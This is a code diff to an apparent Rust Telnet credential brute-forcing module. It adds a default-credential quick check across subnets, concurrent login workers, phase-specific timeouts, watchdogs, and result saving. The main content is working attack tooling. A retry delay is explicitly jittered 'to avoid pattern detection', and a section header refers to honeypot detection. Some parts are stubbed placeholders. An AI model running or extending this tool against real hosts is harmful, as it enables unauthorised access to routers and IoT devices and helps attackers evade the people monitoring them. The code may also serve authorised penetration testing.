@@ -12,15 +12,17 @@
 
 use anyhow::{anyhow, Context, Result};
 use colored::*;
+use rand::Rng;
 use regex::Regex;
 use serde::{Deserialize, Serialize};
-use std::collections::HashSet;
+use std::collections::{HashSet, HashMap};
 use std::net::{SocketAddr, ToSocketAddrs};
 use std::path::Path;
 use std::sync::{
-    atomic::{AtomicBool, AtomicU64, Ordering},
+    atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering},
     Arc,
 };
+use std::time::{SystemTime, UNIX_EPOCH};
 use std::time::{Duration, Instant};
 use tokio::fs::{File, OpenOptions};
 use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
@@ -39,6 +41,7 @@ const PROGRESS_INTERVAL_SECS: u64 = 3;
 const BUFFER_SIZE: usize = 4096;
 const RESPONSE_BUFFER_CAPACITY: usize = 2048;
 const DEFAULT_TELNET_PORTS: &[u16] = &[23, 2323, 23231];
+const TASK_WATCHDOG_TIMEOUT_SECS: u64 = 20;
 
 const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
     ("root", "root"),
@@ -72,7 +75,12 @@ pub struct TelnetBruteforceConfig {
     pub threads: usize,
     pub delay_ms: u64,
     pub connection_timeout: u64,
-    pub read_timeout: u64,
+    pub banner_read_timeout: u64,
+    pub login_prompt_timeout: u64,
+    pub password_prompt_timeout: u64,
+    pub auth_response_timeout: u64,
+    pub command_timeout: u64,
+    pub write_timeout: u64,
     pub stop_on_success: bool,
     pub verbose: bool,
     pub full_combo: bool,
@@ -157,7 +165,12 @@ pub struct Statistics {
     failed_attempts: AtomicU64,
     error_attempts: AtomicU64,
     retried_attempts: AtomicU64,
+    timeouts: AtomicU64,
+    broken_pipes: AtomicU64,
+    hung_tasks: AtomicU64,
+    retries_queued: AtomicU64,
     start_time: Instant,
+    unique_errors: Mutex<HashMap<String, usize>>,
 }
 
 impl Statistics {
@@ -169,7 +182,12 @@ impl Statistics {
             failed_attempts: AtomicU64::new(0),
             error_attempts: AtomicU64::new(0),
             retried_attempts: AtomicU64::new(0),
+            timeouts: AtomicU64::new(0),
+            broken_pipes: AtomicU64::new(0),
+            hung_tasks: AtomicU64::new(0),
+            retries_queued: AtomicU64::new(0),
             start_time: Instant::now(),
+            unique_errors: Mutex::new(HashMap::new()),
         }
     }
 
@@ -188,6 +206,31 @@ impl Statistics {
     #[inline]
     pub fn record_retry(&self) {
         self.retried_attempts.fetch_add(1, Ordering::Relaxed);
+    }
+
+    #[inline]
+    pub fn record_timeout(&self) {
+        self.timeouts.fetch_add(1, Ordering::Relaxed);
+    }
+
+    #[inline]
+    pub fn record_broken_pipe(&self) {
+        self.broken_pipes.fetch_add(1, Ordering::Relaxed);
+    }
+
+    #[inline]
+    pub fn record_hung_task(&self) {
+        self.hung_tasks.fetch_add(1, Ordering::Relaxed);
+    }
+
+    #[inline]
+    pub fn record_retry_queued(&self) {
+        self.retries_queued.fetch_add(1, Ordering::Relaxed);
+    }
+
+    pub async fn record_error_kind(&self, key: &str) {
+        let mut guard = self.unique_errors.lock().await;
+        *guard.entry(key.to_string()).or_insert(0) += 1;
     }
 
     pub fn print_progress(&self) {
@@ -212,13 +255,17 @@ impl Statistics {
         let _ = std::io::Write::flush(&mut std::io::stdout());
     }
 
-    pub fn print_final(&self) {
+    pub async fn print_final(&self) {
         println!();
         let total = self.total_attempts.load(Ordering::Relaxed);
         let success = self.successful_attempts.load(Ordering::Relaxed);
         let failed = self.failed_attempts.load(Ordering::Relaxed);
         let errors = self.error_attempts.load(Ordering::Relaxed);
         let retries = self.retried_attempts.load(Ordering::Relaxed);
+        let timeouts = self.timeouts.load(Ordering::Relaxed);
+        let broken = self.broken_pipes.load(Ordering::Relaxed);
+        let hung = self.hung_tasks.load(Ordering::Relaxed);
+        let queued = self.retries_queued.load(Ordering::Relaxed);
         let elapsed = self.start_time.elapsed().as_secs_f64();
         let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };
 
@@ -227,12 +274,27 @@ impl Statistics {
         println!("  Successful:      {}", success.to_string().green().bold());
         println!("  Failed:          {}", failed);
         println!("  Errors:          {}", errors.to_string().yellow());
-        println!("  Retries:         {}", retries);
+        println!("  Timeouts:        {}", timeouts);
+        println!("  Broken pipes:    {}", broken);
+        println!("  Hung tasks:      {}", hung);
+        println!("  Retries (done):  {}", retries);
+        println!("  Retries (queued):{}", queued);
         println!("  Time elapsed:    {:.2}s", elapsed);
         println!("  Average rate:    {:.2} attempts/sec", rate);
-        if success > 0 {
+        if total > 0 {
             let success_rate = (success as f64 / total as f64) * 100.0;
             println!("  Success rate:    {:.2}%", success_rate);
+        }
+
+        // Print top error types (best-effort)
+        let guard = self.unique_errors.lock().await;
+        if !guard.is_empty() {
+            println!("\n{}", "  Top error types:".bold());
+            let mut items: Vec<_> = guard.iter().collect();
+            items.sort_by(|a, b| b.1.cmp(a.1));
+            for (key, count) in items.into_iter().take(5) {
+                println!("    - {}: {}", key, count);
+            }
         }
     }
 }
@@ -268,6 +330,10 @@ pub async fn run(target: &str) -> Result<()> {
 }
 
 // ============================================================
+// BASIC HONEYPOT DETECTION
+// ============================================================
+
+// ============================================================
 // MODE 1 & 2: SINGLE TARGET / SUBNET BRUTEFORCE
 // ============================================================
 
@@ -289,6 +355,7 @@ async fn run_single_target_bruteforce(target: &str, is_subnet: bool) -> Result<(
     }
 
     let target_primary = targets[0].clone();
+
     let use_config = prompt_yes_no("Do you have a configuration file? (y/n): ", false);
 
     let mut config = if use_config {
@@ -481,37 +548,97 @@ async fn run_quick_check(target: &str, is_subnet: bool) -> Result<()> {
     .parse()
     .unwrap_or(23);
 
+    let verbose = prompt_yes_no("Verbose mode? (show all attempts and details) (y/n): ", false);
+
     println!();
     println!("Testing {} target(s) on port {} with {} default credentials...",
              targets.len(), port, DEFAULT_CREDENTIALS.len());
+    if verbose {
+        println!("{}", "[*] Verbose mode enabled - showing all attempts and details".cyan());
+    }
     println!();
 
     let mut found_any = false;
     let mut results = Vec::new();
+    let mut total_attempts = 0;
+    let mut successful_attempts = 0;
+    let mut failed_attempts = 0;
+    let mut error_attempts = 0;
 
-    for target_ip in targets {
-        println!("[*] Testing {}:{}", target_ip, port);
+    for (target_idx, target_ip) in targets.iter().enumerate() {
+        println!("{}", format!("[*] Testing {}:{} ({}/{})", target_ip, port, target_idx + 1, targets.len()).bold());
+        if verbose {
+            println!("  Target: {}:{}", target_ip, port);
+            println!("  Testing {} default credential pairs...", DEFAULT_CREDENTIALS.len());
+        }
 
-        for (username, password) in DEFAULT_CREDENTIALS {
+        for (cred_idx, (username, password)) in DEFAULT_CREDENTIALS.iter().enumerate() {
+            total_attempts += 1;
+            
+            if verbose {
+                print!("  [{}/{}] Testing {}/{}... ", 
+                       cred_idx + 1,
+                       DEFAULT_CREDENTIALS.len(),
+                       username,
+                       if password.is_empty() { "(blank)" } else { password });
+                let _ = std::io::Write::flush(&mut std::io::stdout());
+            }
+
             match try_telnet_login_simple(&target_ip, port, username, password, 3).await {
                 Ok(true) => {
+                    successful_attempts += 1;
                     let result = format!("{}:{} - {}/{}",
                                          target_ip, port, username,
                                          if password.is_empty() { "(blank)" } else { password });
 
-                    println!(
-                        "  {} Valid: {}/{}",
-                        "✓".bright_green().bold(),
-                             username,
-                             if password.is_empty() { "(blank)" } else { password }
-                    );
+                    if verbose {
+                        println!(
+                            "\r  [{}/{}] {} Valid: {}/{}",
+                            cred_idx + 1,
+                            DEFAULT_CREDENTIALS.len(),
+                            "✓".bright_green().bold(),
+                            username,
+                            if password.is_empty() { "(blank)" } else { password }
+                        );
+                    } else {
+                        println!(
+                            "  {} Valid: {}/{}",
+                            "✓".bright_green().bold(),
+                            username,
+                            if password.is_empty() { "(blank)" } else { password }
+                        );
+                    }
                     results.push(result);
                     found_any = true;
                 }
-                Ok(false) => {}
+                Ok(false) => {
+                    failed_attempts += 1;
+                    if verbose {
+                        println!("\r  [{}/{}] {} Invalid: {}/{}", 
+                                cred_idx + 1,
+                                DEFAULT_CREDENTIALS.len(),
+                                "✗".red(),
+                                username,
+                                if password.is_empty() { "(blank)" } else { password });
+                    }
+                }
                 Err(e) => {
-                    println!("  {} Error: {}", "!".yellow(), e);
-                    break;
+                    error_attempts += 1;
+                    let error_type = classify_telnet_error(&e.to_string());
+                    if verbose {
+                        println!("\r  [{}/{}] {} Error ({}): {}", 
+                                cred_idx + 1,
+                                DEFAULT_CREDENTIALS.len(),
+                                "!".yellow(),
+                                error_type,
+                                e);
+                    } else {
+                        println!("  {} Error: {}", "!".yellow(), e);
+                    }
+                    // Don't break on error in verbose mode - continue testing
+                    if !verbose {
+                        break;
+                    }
                 }
             }
             sleep(Duration::from_millis(200)).await;
@@ -519,12 +646,37 @@ async fn run_quick_check(target: &str, is_subnet: bool) -> Result<()> {
         println!();
     }
 
+    // Print summary
+    if verbose {
+        println!("{}", "=== Quick Check Summary ===".bold().cyan());
+        println!("  Total attempts:    {}", total_attempts);
+        println!("  Successful:       {}", successful_attempts.to_string().green().bold());
+        println!("  Failed:           {}", failed_attempts);
+        println!("  Errors:           {}", error_attempts.to_string().yellow());
+        if total_attempts > 0 {
+            let success_rate = (successful_attempts as f64 / total_attempts as f64) * 100.0;
+            println!("  Success rate:     {:.1}%", success_rate);
+        }
+        println!();
+    }
+
     if !found_any {
         println!("{}", "[-] No valid credentials found".yellow());
-    } else if prompt_yes_no("Save results to file? (y/n): ", true) {
-        let output_path = prompt_required("Output file path: ");
-        save_quick_check_results(&output_path, &results).await?;
-        println!("[+] Results saved to '{}'", output_path);
+    } else {
+        println!("{}", format!("[+] Found {} valid credential(s)", results.len()).green().bold());
+        if verbose {
+            println!("  Valid credentials:");
+            for result in &results {
+                println!("    - {}", result);
+            }
+            println!();
+        }
+        
+        if prompt_yes_no("Save results to file? (y/n): ", true) {
+            let output_path = prompt_required("Output file path: ");
+            save_quick_check_results(&output_path, &results).await?;
+            println!("[+] Results saved to '{}'", output_path);
+        }
     }
 
     Ok(())
@@ -550,57 +702,199 @@ async fn save_quick_check_results(path: &str, results: &[String]) -> Result<()> 
 
 #[inline]
 async fn try_telnet_login(
-    addr: &str,
+    socket: &SocketAddr,
     username: &str,
     password: &str,
     config: &TelnetBruteforceConfig,
 ) -> Result<bool> {
-    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;
 
     let stream = timeout(
         Duration::from_secs(config.connection_timeout),
-                         TcpStream::connect(socket)
+        TcpStream::connect(socket),
     )
     .await
-    .context("Connection timeout")?
-    .context("Connect failed")?;
+    .map_err(|_| anyhow!("Connection timeout"))?
+    .map_err(|e| {
+        let error_msg = format!("{}", e);
+        let error_type = classify_telnet_error(&error_msg);
+        anyhow!("{}: {}", error_type, e)
+    })?;
 
     let (reader, mut writer) = tokio::io::split(stream);
     let mut reader = BufReader::with_capacity(BUFFER_SIZE, reader);
-    let mut buf = vec![0u8; BUFFER_SIZE];
+    let mut buf = bytes::BytesMut::with_capacity(BUFFER_SIZE);
 
     let mut login_sent = false;
     let mut pass_sent = false;
     let mut response_after_pass = String::with_capacity(RESPONSE_BUFFER_CAPACITY);
 
-    let read_timeout_duration = Duration::from_millis(config.read_timeout * 1000);
+    // Phase-specific timeouts for better control
+    let banner_timeout = Duration::from_secs(config.banner_read_timeout);
+    let login_prompt_timeout = Duration::from_secs(config.login_prompt_timeout);
+    let password_prompt_timeout = Duration::from_secs(config.password_prompt_timeout);
+    let auth_response_timeout = Duration::from_secs(config.auth_response_timeout);
+    let write_timeout = Duration::from_millis(config.write_timeout);
 
     for cycle in 0..15 {
-        let read_result = timeout(read_timeout_duration, reader.read(&mut buf)).await;
+        // Choose timeout based on current phase
+        let current_timeout = if !login_sent {
+            // Waiting for initial banner/login prompt
+            if cycle == 0 {
+                banner_timeout
+            } else {
+                login_prompt_timeout
+            }
+        } else if login_sent && !pass_sent {
+            // Waiting for password prompt
+            password_prompt_timeout
+        } else if pass_sent {
+            // Waiting for authentication response
+            auth_response_timeout
+        } else {
+            Duration::from_secs(1) // fallback
+        };
 
-        let n = match read_result {
-            Ok(Ok(0)) => break,
+        // Track buffer length before reading to extract only new data
+        let buf_len_before = buf.len();
+
+        let read_result = timeout(current_timeout, reader.read_buf(&mut buf)).await;
+
+        let _bytes_read = match read_result {
+            Ok(Ok(0)) => {
+                // EOF received - check if this is a half-close (read closed but write still open)
+                // Try to detect half-close by attempting a small write
+                let half_close_detected = match timeout(Duration::from_millis(100), writer.write_all(b"\r\n")).await {
+                    Ok(Ok(_)) => {
+                        // Write succeeded - this is a half-close (read side closed, write side open)
+                        true
+                    }
+                    Ok(Err(_)) | Err(_) => {
+                        // Write failed or timed out - full close
+                        false
+                    }
+                };
+                
+                // Classify the type of disconnect
+                match classify_eof(&response_after_pass, login_sent, pass_sent, cycle) {
+                    EofType::CleanClose => {
+                        if half_close_detected {
+                            // Half-close detected - server closed read side but write still works
+                            // This often happens after successful authentication on some systems
+                            if pass_sent && has_success_indicators(&response_after_pass) {
+                                return Ok(true);
+                            } else if pass_sent && response_after_pass.len() > 0 {
+                                // Got some response before half-close, likely success
+                                return Ok(true);
+                            }
+                        }
+                        // Server properly closed connection
+                        if pass_sent && has_success_indicators(&response_after_pass) {
+                            // Only consider it success if we have clear success indicators
+                            return Ok(true);
+                        } else {
+                            // Clean close without success indicators means authentication failed
+                            return Ok(false);
+                        }
+                    }
+                    EofType::AbruptDisconnect => {
+                        if half_close_detected {
+                            return Err(anyhow!("Connection half-closed (read side closed)"));
+                        }
+                        // Connection was reset or network error
+                        return Err(anyhow!("Connection abruptly closed"));
+                    }
+                    EofType::PartialData => {
+                        if half_close_detected {
+                            // Half-close with partial data - likely success
+                            return Ok(true);
+                        }
+                        // Got some data then EOF - check if it contains success indicators
+                        if pass_sent && has_success_indicators(&response_after_pass) {
+                            return Ok(true);
+                        } else {
+                            return Ok(false);
+                        }
+                    }
+                }
+            }
             Ok(Ok(n)) => n,
-            Ok(Err(_)) | Err(_) => {
+            Ok(Err(e)) => {
+                // Read error - classify the type with enhanced error classification
+                let error_msg = format!("{}", e);
+                let error_type = classify_telnet_error(&error_msg);
+                
+                if is_connection_error(&e) {
+                    return Err(anyhow!("{}: {}", error_type, e));
+                }
                 if pass_sent && cycle >= 3 {
                     break;
                 }
                 continue;
             }
+            Err(_) => {
+                // Timeout
+                if pass_sent && cycle >= 3 {
+                    // If we sent password and timed out, check accumulated response
+                    return Ok(has_success_indicators(&response_after_pass));
+                }
+                continue;
+            }
         };
 
-        let output = String::from_utf8_lossy(&buf[..n]);
-        let lower = output.to_lowercase();
+        // Extract only the newly read data from buffer
+        // Validate index to prevent panic
+        let new_data = if buf_len_before <= buf.len() {
+            buf.split_off(buf_len_before)
+        } else {
+            // Buffer shrank unexpectedly, use entire buffer
+            eprintln!("[!] Buffer length inconsistency detected");
+            buf.split_off(0)
+        };
+        
+        // Process Telnet IAC commands to get clean application data
+        let (clean_bytes, iac_responses) = process_telnet_iac(&new_data);
+        
+        // Send IAC responses back to server if any
+        if !iac_responses.is_empty() {
+            if let Err(e) = timeout(write_timeout, writer.write_all(&iac_responses)).await {
+                // Log but don't fail - IAC negotiation is best-effort
+                if config.verbose {
+                    eprintln!("[!] Failed to send IAC response: {}", e);
+                }
+            }
+        }
+        
+        // Convert to string for text processing
+        let output = String::from_utf8_lossy(&clean_bytes).to_string();
+        let clean_output = strip_ansi_escape_sequences(&output);
+        let lower = clean_output.to_lowercase();
+
+        // Clear any remaining buffer data to prevent accumulation across cycles
+        buf.clear();
 
         if pass_sent {
-            response_after_pass.push_str(&output);
+            // Prevent memory exhaustion by limiting response buffer size
+            const MAX_RESPONSE_BUFFER_SIZE: usize = 65536; // 64KB limit
+            if response_after_pass.len() + output.len() <= MAX_RESPONSE_BUFFER_SIZE {
+                response_after_pass.push_str(&output);
+            } else if response_after_pass.len() < MAX_RESPONSE_BUFFER_SIZE {
+                // Add truncation marker if we're near the limit
+                let remaining_space = MAX_RESPONSE_BUFFER_SIZE - response_after_pass.len();
+                if remaining_space > 3 {
+                    response_after_pass.push_str(&output[..remaining_space - 3]);
+                    response_after_pass.push_str("...");
+                }
+            }
+            // If buffer is already at max size, don't add more data
         }
 
         if !login_sent {
             for prompt in &config.login_prompts_lower {
                 if lower.contains(prompt.as_str()) {
                     let login_data = format!("{}\r\n", username);
-                    timeout(Duration::from_millis(500), writer.write_all(login_data.as_bytes())).await.ok();
+                    if let Err(_) = timeout(write_timeout, writer.write_all(login_data.as_bytes())).await {
+                        return Err(anyhow!("Write timeout when sending username"));
+                    }
                     login_sent = true;
                     break;
                 }
@@ -614,7 +908,9 @@ async fn try_telnet_login(
             for prompt in &config.password_prompts_lower {
                 if lower.contains(prompt.as_str()) {
                     let pass_data = format!("{}\r\n", password);
-                    timeout(Duration::from_millis(500), writer.write_all(pass_data.as_bytes())).await.ok();
+                    if let Err(_) = timeout(write_timeout, writer.write_all(pass_data.as_bytes())).await {
+                        return Err(anyhow!("Write timeout when sending password"));
+                    }
                     pass_sent = true;
                     break;
                 }
@@ -766,6 +1062,9 @@ async fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
     let output_file = Arc::new(config.output_file.clone());
     initialize_output_file(&output_file, &config).await?;
 
+    // Create buffered result writer for efficient I/O
+    let result_writer = Arc::new(Mutex::new(BufferedResultWriter::new(&output_file).await?));
+
     let found_creds = Arc::new(Mutex::new(HashSet::new()));
     let stop_flag = Arc::new(AtomicBool::new(false));
     let stats = Arc::new(Statistics::new());
@@ -784,7 +1083,8 @@ async fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
         stop_flag.clone(),
     );
 
-    let semaphore = Arc::new(Semaphore::new(config.threads));
+    // Create a resource-aware semaphore that can dynamically adjust concurrency
+    let semaphore = Arc::new(ResourceAwareSemaphore::new(config.threads));
     let rx = Arc::new(Mutex::new(rx));
     let mut worker_handles = Vec::with_capacity(config.threads);
 
@@ -795,7 +1095,7 @@ async fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
                              addr.clone(),
                              stop_flag.clone(),
                              found_creds.clone(),
-                             output_file.clone(),
+                             result_writer.clone(),
                              config.clone(),
                              stats.clone(),
                              semaphore.clone(),
@@ -805,14 +1105,21 @@ async fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
 
     let progress_handle = spawn_progress_reporter(stats.clone(), stop_flag.clone());
 
-    for h in worker_handles {
-        let _ = h.await;
+    for (i, h) in worker_handles.into_iter().enumerate() {
+        if let Err(e) = h.await {
+            eprintln!("[!] Worker {} failed: {}", i, e);
+        }
     }
 
     stop_flag.store(true, Ordering::Relaxed);
     let _ = progress_handle.await;
 
-    stats.print_final();
+    // Finalize buffered result writer to ensure all data is written
+    if let Err(e) = result_writer.lock().await.finalize().await {
+        eprintln!("[!] Failed to finalize result writer: {}", e);
+    }
+
+    stats.print_final().await;
     print_final_report(&found_creds, &output_file).await;
 
     Ok(())
@@ -978,16 +1285,164 @@ async fn check_port(ip: &str, port: u16, timeout_duration: Duration) -> Result<O
 // WORKER AND PRODUCER FUNCTIONS
 // ============================================================
 
+/// Resource-aware semaphore that monitors system resources and adjusts concurrency
+struct ResourceAwareSemaphore {
+    semaphore: Semaphore,
+    original_permits: usize,
+    current_permits: AtomicUsize,
+    last_resource_check: AtomicU64, // Unix timestamp in seconds
+}
+
+impl ResourceAwareSemaphore {
+    fn new(initial_permits: usize) -> Self {
+        let now = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .map(|d| d.as_secs())
+            .unwrap_or(0); // Fallback to 0 if system time is broken
+
+        Self {
+            semaphore: Semaphore::new(initial_permits),
+            original_permits: initial_permits,
+            current_permits: AtomicUsize::new(initial_permits),
+            last_resource_check: AtomicU64::new(now),
+        }
+    }
+
+    async fn acquire(&self) -> Result<tokio::sync::SemaphorePermit<'_>, tokio::sync::AcquireError> {
+        // Check if we need to run resource monitoring
+        let now = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .map(|d| d.as_secs())
+            .unwrap_or(0); // Fallback to 0 if system time is broken
+
+        let last_check = self.last_resource_check.load(Ordering::Relaxed);
+        let should_check = now.saturating_sub(last_check) > 10; // Check every 10 seconds
+
+        if should_check {
+            // Perform resource check
+            self.perform_resource_check().await;
+
+            // Update last check time
+            self.last_resource_check.store(now, Ordering::Relaxed);
+        }
+
+        // Adaptive delay based on recent performance
+        self.apply_adaptive_delay().await;
+
+        // Only acquire if we're within the current concurrency limit
+        let current_limit = self.current_permits.load(Ordering::Relaxed);
+        if current_limit > 0 {
+            self.semaphore.acquire().await
+        } else {
+            // Concurrency reduced to 0, wait for it to be increased
+            loop {
+                tokio::time::sleep(Duration::from_millis(100)).await;
+                let new_limit = self.current_permits.load(Ordering::Relaxed);
+                if new_limit > 0 {
+                    break self.semaphore.acquire().await;
+                }
+            }
+        }
+    }
+
+    async fn apply_adaptive_delay(&self) {
+        // This would be called to add adaptive delays based on target responsiveness
+        // For now, it's a placeholder - the actual implementation would track
+        // response times, success rates, and connection failures to determine
+        // appropriate delays between attempts
+
+        // Example logic (not implemented yet):
+        // - Track rolling average response time
+        // - Track success rate over last N attempts
+        // - If success rate > 80% and avg response < 500ms, reduce delay
+        // - If success rate < 20% or many timeouts, increase delay
+        // - If connection refused, add exponential backoff
+    }
+
+    async fn perform_resource_check(&self) {
+        // Check available file descriptors (rough estimate)
+        let available_fds = self.estimate_available_file_descriptors();
+
+        // Check memory usage
+        let memory_pressure = self.check_memory_pressure().await;
+
+        let current = self.current_permits.load(Ordering::Relaxed);
+        let mut new_permits = current;
+
+        // Reduce concurrency if resources are low
+        if available_fds < 100 || memory_pressure > 0.8 {
+            new_permits = (current * 3 / 4).max(1); // Reduce to 75%, minimum 1
+            if new_permits < current {
+                println!(
+                    "{} Resource pressure detected (FDs: {}, Memory: {:.1}%), reducing concurrency to {}",
+                    "[!]".yellow(),
+                    available_fds,
+                    memory_pressure * 100.0,
+                    new_permits
+                );
+            }
+        }
+        // Gradually increase concurrency if resources are plentiful
+        else if available_fds > 500 && memory_pressure < 0.3 && current < self.original_permits {
+            new_permits = (current * 5 / 4).min(self.original_permits); // Increase to 125%, max original
+        }
+
+        if new_permits != current {
+            // Adjust semaphore permits by adding/removing the difference
+            let diff = new_permits as isize - current as isize;
+            if diff > 0 {
+                // Add permits
+                for _ in 0..diff {
+                    self.semaphore.add_permits(1);
+                }
+            } else if diff < 0 {
+                // NOTE: Reducing semaphore permits is complex in tokio.
+                // For now, we just update the current_permits counter to reflect
+                // the desired concurrency level. The semaphore will still allow
+                // up to its original capacity, but we'll respect the reduced limit
+                // in our logic by not acquiring more than current_permits.
+                //
+                // A proper fix would require recreating the semaphore or using
+                // a different concurrency control mechanism.
+            }
+
+            self.current_permits.store(new_permits, Ordering::Relaxed);
+        }
+    }
+
+    fn estimate_available_file_descriptors(&self) -> usize {
+        // Rough estimate based on typical limits
+        // In a real implementation, you'd query the actual system limits
+        // For now, use a conservative estimate
+        1024 // Assume 1024 available FDs as a baseline
+    }
+
+    async fn check_memory_pressure(&self) -> f64 {
+        // Use sysinfo to check memory usage
+        let mut system = sysinfo::System::new_all();
+        system.refresh_all();
+
+        let total_memory = system.total_memory() as f64;
+        let available_memory = system.available_memory() as f64;
+
+        if total_memory > 0.0 {
+            1.0 - (available_memory / total_memory)
+        } else {
+            0.0
+        }
+    }
+}
+
 fn spawn_worker(
     worker_id: usize,
     rx: Arc<Mutex<mpsc::Receiver<(Arc<str>, Arc<str>)>>>,
                 addr: String,
                 stop_flag: Arc<AtomicBool>,
                 found_creds: Arc<Mutex<HashSet<(String, String)>>>,
-                output_file: Arc<String>,
+                result_writer: Arc<Mutex<BufferedResultWriter>>,
                 config: TelnetBruteforceConfig,
                 stats: Arc<Statistics>,
-                semaphore: Arc<Semaphore>,
+                semaphore: Arc<ResourceAwareSemaphore>,
 ) -> tokio::task::JoinHandle<()> {
     tokio::spawn(async move {
         loop {
@@ -998,22 +1453,27 @@ fn spawn_worker(
                 break;
             }
 
-            let pair = {
-                let mut guard = rx.lock().await;
+            let pair = loop {
+                // Try to receive message
+                let recv_result = {
+                    let mut guard = rx.lock().await;
+                    guard.try_recv()
+                };
 
-                match guard.try_recv() {
-                    Ok(p) => Some(p),
-                 Err(mpsc::error::TryRecvError::Empty) => {
-                     drop(guard);
+                match recv_result {
+                    Ok(p) => break Some(p),
+                    Err(mpsc::error::TryRecvError::Empty) => {
+                        // No message available, wait a bit before trying again
+                        // But release the lock first to prevent deadlock
+                        sleep(Duration::from_millis(10)).await;
 
-                     if stop_flag.load(Ordering::SeqCst) {
-                         break;
-                     }
-
-                     sleep(Duration::from_millis(10)).await;
-                     continue;
-                 }
-                 Err(mpsc::error::TryRecvError::Disconnected) => None,
+                        // Check stop flag after sleep
+                        if stop_flag.load(Ordering::SeqCst) {
+                            break None;
+                        }
+                        continue;
+                    }
+                    Err(mpsc::error::TryRecvError::Disconnected) => break None,
                 }
             };
 
@@ -1024,27 +1484,98 @@ fn spawn_worker(
                 break;
             };
 
+            // Resolve DNS once per target to avoid repeated lookups
+            let socket = match addr.to_socket_addrs() {
+                Ok(mut addrs) => {
+                    match addrs.next() {
+                        Some(socket) => socket,
+                        None => {
+                            eprintln!(
+                                "[!] Worker {} failed to resolve address {}",
+                                worker_id,
+                                sanitize_input(addr.as_str())
+                            );
+                            continue;
+                        }
+                    }
+                }
+                Err(e) => {
+                    eprintln!(
+                        "[!] Worker {} DNS resolution failed for {}: {}",
+                        worker_id,
+                        sanitize_input(addr.as_str()),
+                        e
+                    );
+                    continue;
+                }
+            };
+
+            // Atomically check stop flag and acquire permit to prevent race condition
+            let _permit = match semaphore.acquire().await {
+                Ok(permit) => permit,
+                Err(_) => {
+                    eprintln!("[!] Worker {} failed to acquire semaphore permit", worker_id);
+                    break;
+                }
+            };
+
+            // Check stop flag after acquiring permit but before starting work
             if stop_flag.load(Ordering::SeqCst) {
                 if config.verbose {
-                    println!("[*] Worker {} dropping work {}:{} (stopped)", worker_id, user, pass);
+                    println!(
+                        "[*] Worker {} dropping work {}:{} (stopped)",
+                        worker_id,
+                        sanitize_input(user.as_ref()),
+                        sanitize_input(pass.as_ref())
+                    );
                 }
+                drop(_permit); // Explicitly drop permit to release it
                 break;
             }
 
-            let _permit = semaphore.acquire().await.unwrap();
-
             if stop_flag.load(Ordering::SeqCst) {
                 if config.verbose {
-                    println!("[*] Worker {} aborting attempt {}:{} (stopped)", worker_id, user, pass);
+                    println!(
+                        "[*] Worker {} aborting attempt {}:{} (stopped)",
+                        worker_id,
+                        sanitize_input(user.as_ref()),
+                        sanitize_input(pass.as_ref())
+                    );
                 }
                 break;
             }
 
             if config.verbose {
-                println!("{} [Worker {}] Trying {}:{}", "[*]".bright_blue(), worker_id, user, &pass);
+                println!(
+                    "{} [Worker {}] Trying {}:{}",
+                    "[*]".bright_blue(),
+                    worker_id,
+                    sanitize_input(user.as_ref()),
+                    sanitize_input(pass.as_ref())
+                );
             }
 
-            let mut attempt_result = try_telnet_login(&addr, &user, &pass, &config).await;
+            // Watchdog around the full login attempt
+            let attempt_future = try_telnet_login(&socket, &user, &pass, &config);
+            let mut attempt_result = match timeout(Duration::from_secs(TASK_WATCHDOG_TIMEOUT_SECS), attempt_future).await {
+                Ok(res) => res,
+                Err(_) => {
+                    // Don't count as regular attempt since it never completed
+                    stats.record_hung_task();
+                    stats.record_error_kind("Task watchdog timeout").await;
+                    if config.verbose {
+                        eprintln!(
+                            "{}",
+                            format!(
+                                "[!] Worker {}: attempt {}:{} hung (watchdog timeout)",
+                                worker_id, user, pass
+                            )
+                            .yellow()
+                        );
+                    }
+                    continue;
+                }
+            };
 
             let mut retry_count = 0;
             while config.retry_on_error && retry_count < config.max_retries && attempt_result.is_err() {
@@ -1054,8 +1585,39 @@ fn spawn_worker(
 
                 retry_count += 1;
                 stats.record_retry();
-                sleep(Duration::from_millis(config.delay_ms * 2)).await;
-                attempt_result = try_telnet_login(&addr, &user, &pass, &config).await;
+                stats.record_retry_queued();
+
+                // Exponential backoff with jitter to avoid pattern detection
+                let base_delay = config.delay_ms;
+                let backoff_multiplier = (1u64 << retry_count).min(8); // Cap at 8x
+                let backoff_delay = base_delay * backoff_multiplier;
+
+                // Add jitter: randomize between 0% and 50% of the delay
+                let jitter_range = backoff_delay / 2;
+                let jitter = rand::rng().random_range(0..=jitter_range);
+                let total_delay = backoff_delay + jitter;
+
+                sleep(Duration::from_millis(total_delay)).await;
+                let retry_future = try_telnet_login(&socket, &user, &pass, &config);
+                attempt_result = match timeout(Duration::from_secs(TASK_WATCHDOG_TIMEOUT_SECS), retry_future).await {
+                    Ok(res) => res,
+                    Err(_) => {
+                        // Don't count as regular attempt since it never completed
+                        stats.record_hung_task();
+                        stats.record_error_kind("Task watchdog timeout").await;
+                        if config.verbose {
+                            eprintln!(
+                                "{}",
+                                format!(
+                                    "[!] Worker {}: retry attempt {}:{} hung (watchdog timeout)",
+                                    worker_id, user, pass
+                                )
+                                .yellow()
+                            );
+                        }
+                        break;
+                    }
+                };
             }
 
             match attempt_result {
@@ -1066,9 +1628,18 @@ fn spawn_worker(
                     if creds.insert((user.to_string(), pass.to_string())) {
                         drop(creds);
 
-                        println!("\n{}", format!("[+] VALID: {}:{}", user, pass).green().bold());
+                        println!(
+                            "\n{}",
+                            format!(
+                                "[+] VALID: {}:{}",
+                                sanitize_input(user.as_ref()),
+                                sanitize_input(pass.as_ref())
+                            )
+                            .green()
+                            .bold()
+                        );
 
-                        if let Err(e) = append_result(&output_file, &user, &pass).await {
+                        if let Err(e) = result_writer.lock().await.write_result(&user, &pass).await {
                             eprintln!("[!] Failed to write result: {}", e);
                         }
